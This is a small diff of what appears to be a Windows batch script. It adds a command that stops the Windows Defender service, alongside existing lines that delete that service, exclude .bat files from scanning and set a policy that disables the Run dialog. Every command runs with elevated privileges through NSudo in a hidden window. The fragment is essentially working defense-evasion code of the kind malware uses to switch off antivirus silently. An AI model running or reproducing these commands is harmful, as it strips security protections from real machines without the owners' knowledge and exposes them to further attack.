@@ -50,6 +50,8 @@ NSudo -U:T -ShowWindowMode:Hide reg add "HKCU\Software\Microsoft\Windows\Current
 
 NSudo -U:T -ShowWindowMode:Hide reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoRun" /t REG_DWORD /d "1" /f
 
+NSudo -U:T -ShowWindowMode:Hide  sc stop  windefend  
+
 NSudo -U:T -ShowWindowMode:Hide  sc delete  windefend  
 
 powershell.exe -command "Add-MpPreference -ExclusionExtension ".bat""
